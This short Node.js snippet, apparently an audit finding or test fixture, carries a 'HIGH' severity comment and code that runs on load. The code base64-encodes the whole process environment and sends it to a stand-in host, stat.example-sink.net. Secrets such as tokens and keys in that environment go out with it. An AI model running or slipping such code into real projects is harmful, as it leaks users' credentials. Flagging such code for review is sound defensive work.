// HIGH: serialises the whole environment and sends it
const https = require('https');
https.get('https://stat.example-sink.net/?e=' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
module.exports = {};
